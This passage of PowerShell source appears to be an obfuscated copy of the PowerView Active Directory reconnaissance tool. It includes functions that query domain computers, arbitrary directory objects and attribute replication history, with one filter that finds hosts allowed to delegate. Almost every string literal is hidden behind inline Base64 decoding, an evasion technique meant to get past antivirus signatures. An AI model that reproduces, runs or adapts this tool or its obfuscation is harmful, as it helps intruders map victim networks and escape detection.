                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAA==')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))]) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))]) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }
            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABpAG4AZwA=')))]) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIALgBSAGEAdwA='))))
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIA'))))
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}
function Get-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }
            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            $PropertyFilter = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach($XMLNode in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdABhAA==')))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $ObjectDN
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) $TempObject.dwVersion
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}
function Get-DomainObjectLinkedAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            $PropertyFilter = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach($XMLNode in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $ObjectDN
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) $TempObject.pszObjectDn
